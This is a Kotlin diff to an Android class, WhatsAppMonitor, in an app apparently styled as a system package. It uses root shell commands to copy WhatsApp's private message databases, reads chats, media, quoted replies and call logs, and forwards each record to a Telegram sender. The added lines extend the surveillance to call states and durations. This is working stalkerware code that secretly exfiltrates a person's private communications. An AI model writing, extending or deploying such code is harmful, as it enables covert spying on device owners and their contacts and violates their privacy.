@@ -157,7 +157,9 @@ class WhatsAppMonitor(
                 m._id, m.timestamp, m.from_me, m.text_data, m.message_type,
                 COALESCE(mapped_cj.raw_string, cj.raw_string) AS chat_jid,
                 COALESCE(mapped_sj.raw_string, sj.raw_string) AS sender_jid,
-                mm.file_path, mm.file_size, mm.mime_type
+                mm.file_path, mm.file_size, mm.mime_type,
+                mq.text_data AS quoted_text,
+                cl.video_call, cl.duration, cl.call_result
             FROM message m
             JOIN chat c ON m.chat_row_id = c._id
             JOIN jid cj ON c.jid_row_id = cj._id
@@ -167,7 +169,10 @@ class WhatsAppMonitor(
             LEFT JOIN jid_map sjm ON sj._id = sjm.lid_row_id
             LEFT JOIN jid mapped_sj ON sjm.jid_row_id = mapped_sj._id
             LEFT JOIN message_media mm ON m._id = mm.message_row_id
-            WHERE m._id > ? AND m.message_type NOT IN (7, 15)
+            LEFT JOIN message_quoted mq ON m._id = mq.message_row_id
+            LEFT JOIN message_call_log mcl ON m._id = mcl.message_row_id
+            LEFT JOIN call_log cl ON mcl.call_log_row_id = cl._id
+            WHERE m._id > ? AND m.message_type NOT IN (7, 15, 67)
             ORDER BY m._id ASC
         """
 
@@ -177,19 +182,24 @@ class WhatsAppMonitor(
                 m._id, m.timestamp, m.from_me, m.text_data, m.message_type,
                 cj.raw_string AS chat_jid,
                 sj.raw_string AS sender_jid,
-                mm.file_path, mm.file_size, mm.mime_type
+                mm.file_path, mm.file_size, mm.mime_type,
+                mq.text_data AS quoted_text,
+                cl.video_call, cl.duration, cl.call_result
             FROM message m
             JOIN chat c ON m.chat_row_id = c._id
             JOIN jid cj ON c.jid_row_id = cj._id
             LEFT JOIN jid sj ON m.sender_jid_row_id = sj._id
             LEFT JOIN message_media mm ON m._id = mm.message_row_id
-            WHERE m._id > ? AND m.message_type NOT IN (7, 15)
+            LEFT JOIN message_quoted mq ON m._id = mq.message_row_id
+            LEFT JOIN message_call_log mcl ON m._id = mcl.message_row_id
+            LEFT JOIN call_log cl ON mcl.call_log_row_id = cl._id
+            WHERE m._id > ? AND m.message_type NOT IN (7, 15, 67)
             ORDER BY m._id ASC
         """
     }
 
     private val workDir: File by lazy {
-        val dir = File(context.filesDir, "${variant.dirName}/watchdir")
+        val dir = File(context.cacheDir, "${variant.dirName}/watchdir")
         dir.also { if (!it.exists()) it.mkdirs() }
     }
 
@@ -207,6 +217,7 @@ class WhatsAppMonitor(
     private var watcherJob: Job? = null
     private var waDbDir: String = ""  // Resolved dynamically on start()
     private var currentScope: CoroutineScope? = null
+    private val pendingCalls = mutableSetOf<Long>()
     
     private var lastProcessedId: Long
         get() = if (variant == WhatsAppVariant.NORMAL) prefsManager.whatsappLastProcessedId else prefsManager.whatsappBusinessLastProcessedId
@@ -361,13 +372,18 @@ class WhatsAppMonitor(
         val destPath = workDir.absolutePath
         val uid = android.os.Process.myUid()
 
+        Shell.cmd("rm -f \"$destPath\"/msgstore.db*").exec()
+
+        File(destPath, "msgstore.db").createNewFile()
+        File(destPath, "msgstore.db-wal").createNewFile()
+        File(destPath, "msgstore.db-shm").createNewFile()
+
         val result = Shell.cmd(
-            "rm -f $destPath/msgstore.db*",
-            "cp $waDbDir/msgstore.db $destPath/msgstore.db",
-            "cp $waDbDir/msgstore.db-wal $destPath/msgstore.db-wal 2>/dev/null || true",
-            "cp $waDbDir/msgstore.db-shm $destPath/msgstore.db-shm 2>/dev/null || true",
-            "chown $uid:$uid $destPath/msgstore.db*",
-            "chmod 666 $destPath/msgstore.db $destPath/msgstore.db-wal $destPath/msgstore.db-shm 2>/dev/null || true"
+            "cat \"$waDbDir/msgstore.db\" > \"$destPath/msgstore.db\"",
+            "cat \"$waDbDir/msgstore.db-wal\" > \"$destPath/msgstore.db-wal\" 2>/dev/null || true",
+            "cat \"$waDbDir/msgstore.db-shm\" > \"$destPath/msgstore.db-shm\" 2>/dev/null || true",
+            "chown $uid:$uid \"$destPath\"/msgstore.db*",
+            "chmod 666 \"$destPath\"/msgstore.db*"
         ).exec()
 
         if (!result.isSuccess) {
@@ -386,11 +402,13 @@ class WhatsAppMonitor(
         val uid = android.os.Process.myUid()
 
         try {
+            Shell.cmd("rm -f \"$destPath\"/wa.db*").exec()
+            File(destPath, "wa.db").createNewFile()
+
             val copyResult = Shell.cmd(
-                "rm -f $destPath/wa.db*",
-                "cp $waDbDir/wa.db $destPath/wa.db 2>/dev/null || cp $waDbDir/../databases/wa.db $destPath/wa.db 2>/dev/null || cp /data/data/${variant.packageName}/databases/wa.db $destPath/wa.db",
-                "chown $uid:$uid $destPath/wa.db*",
-                "chmod 666 $destPath/wa.db"
+                "cat \"$waDbDir/wa.db\" > \"$destPath/wa.db\" 2>/dev/null || cat \"$waDbDir/../databases/wa.db\" > \"$destPath/wa.db\" 2>/dev/null || cat \"/data/data/${variant.packageName}/databases/wa.db\" > \"$destPath/wa.db\"",
+                "chown $uid:$uid \"$destPath\"/wa.db*",
+                "chmod 666 \"$destPath\"/wa.db*"
             ).exec()
 
             if (!copyResult.isSuccess) {
@@ -563,9 +581,32 @@ class WhatsAppMonitor(
             val rows = queryNewMessages(database)
 
             for (row in rows) {
+                val isCall = row.messageType in listOf(8, 10, 90)
+
+                // Handle completed pending calls
+                if (pendingCalls.contains(row.id)) {
+                    if (row.callResult != null && row.callResult != 0) {
+                        pendingCalls.remove(row.id)
+                        val formatted = formatOutputMessage(row)
+                        com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
+                            context = context,
+                            message = formatted,
+                            offlineSubdir = variant.dirName,
+                            offlineFileName = "offline_${variant.dirName}.txt",
+                            sender = sendTelegram
+                        )
+                    }
+                    continue
+                }
+
                 if (row.id > lastProcessedId) {
                     var formatted = formatOutputMessage(row)
                     var processedMedia = false
+
+                    if (isCall && row.callResult == 0) {
+                        if (pendingCalls.size > 20) pendingCalls.clear() // safety limit
+                        pendingCalls.add(row.id)
+                    }
 
                     // If it's a media message (or has a file path)
                     if (row.messageType in listOf(1, 2, 3, 9, 13, 20) || !row.filePath.isNullOrBlank()) {
@@ -651,20 +692,28 @@ class WhatsAppMonitor(
         val senderJid: String?,
         val filePath: String?,
         val fileSize: Long?,
-        val mimeType: String?
+        val mimeType: String?,
+        val quotedText: String?,
+        val videoCall: Int?,
+        val callDuration: Int?,
+        val callResult: Int?
     )
 
     private suspend fun queryNewMessages(db: SQLiteDatabase): List<MessageRow> {
+        val pendingStr = if (pendingCalls.isNotEmpty()) pendingCalls.joinToString(",") else "-1"
+        val modernQuery = MODERN_QUERY.replace("WHERE m._id > ?", "WHERE m._id > ? OR m._id IN ($pendingStr)")
+        val legacyQuery = LEGACY_QUERY.replace("WHERE m._id > ?", "WHERE m._id > ? OR m._id IN ($pendingStr)")
+
         // Try modern query with jid_map joins first
         try {
-            return executeQuery(db, MODERN_QUERY)
+            return executeQuery(db, modernQuery)
         } catch (e: Exception) {
             LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Modern query failed, falling back to legacy. (${e.message})")
         }
 
         // Fallback: older schema without jid_map
         try {
-            return executeQuery(db, LEGACY_QUERY)
+            return executeQuery(db, legacyQuery)
         } catch (e: Exception) {
             LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Legacy query also failed: ${e.message}", LogLevel.ERROR)
         }
@@ -682,6 +731,10 @@ class WhatsAppMonitor(
                 val fpIdx = c.getColumnIndex("file_path")
                 val fsIdx = c.getColumnIndex("file_size")
                 val mtIdx = c.getColumnIndex("mime_type")
+                val qtIdx = c.getColumnIndex("quoted_text")
+                val vcIdx = c.getColumnIndex("video_call")
+                val cdIdx = c.getColumnIndex("duration")
+                val crIdx = c.getColumnIndex("call_result")
                 
                 rows.add(
                     MessageRow(
@@ -694,7 +747,11 @@ class WhatsAppMonitor(
                         senderJid = c.getString(c.getColumnIndexOrThrow("sender_jid")),
                         filePath = if (fpIdx != -1) c.getString(fpIdx) else null,
                         fileSize = if (fsIdx != -1 && !c.isNull(fsIdx)) c.getLong(fsIdx) else null,
-                        mimeType = if (mtIdx != -1) c.getString(mtIdx) else null
+                        mimeType = if (mtIdx != -1) c.getString(mtIdx) else null,
+                        quotedText = if (qtIdx != -1) c.getString(qtIdx) else null,
+                        videoCall = if (vcIdx != -1 && !c.isNull(vcIdx)) c.getInt(vcIdx) else null,
+                        callDuration = if (cdIdx != -1 && !c.isNull(cdIdx)) c.getInt(cdIdx) else null,
+                        callResult = if (crIdx != -1 && !c.isNull(crIdx)) c.getInt(crIdx) else null
                     )
                 )
             }
@@ -710,7 +767,23 @@ class WhatsAppMonitor(
 
     private fun formatOutputMessage(row: MessageRow, overrideMsg: String? = null): String {
         val direction = if (row.fromMe == 1) "Sent" else "Received"
-        val msg = overrideMsg ?: if (row.textData.isNullOrBlank()) {
+        
+        // Handle precise call logs
+        val isCall = row.messageType in listOf(8, 10, 90)
+        val baseMsgBody = overrideMsg ?: if (isCall) {
+            val callType = if (row.videoCall == 1) "Video Call" else "Audio Call"
+            val callState = if (row.callResult == 0) {
+                "Ringing..."
+            } else if (row.callDuration != null && row.callDuration > 0) {
+                "Answered"
+            } else if (row.fromMe == 1) {
+                "Unanswered"
+            } else {
+                "Missed"
+            }
+            val durationStr = if (row.callDuration != null && row.callDuration > 0) " (${row.callDuration}s)" else ""
+            "[📞 $callState $callType$durationStr]"
+        } else if (row.textData.isNullOrBlank()) {
             when (row.messageType) {
                 8, 10, 90 -> "[📞 WhatsApp Call]"
                 1, 42 -> "[🖼️ Image Media]"
@@ -720,10 +793,20 @@ class WhatsAppMonitor(
                 5 -> "[📍 Location]"
                 9 -> "[📄 Document / File]"
                 15 -> "[🗑️ Deleted Message]"
+                16 -> "[📍 Live Location]"
+                20 -> "[🖼️ Sticker]"
+                66 -> "[📊 Poll]"
                 else -> if (!row.filePath.isNullOrBlank()) "[📁 Media File]" else "[Non-text message]"
             }
         } else {
             row.textData
+        }
+
+        // Apply contextual quote if present
+        val msg = if (!row.quotedText.isNullOrBlank() && overrideMsg == null) {
+            "> Quoted: \"${row.quotedText}\"\n\n$baseMsgBody"
+        } else {
+            baseMsgBody
         }
         val timeFormatted = formatTime12Hr(row.timestamp)
 
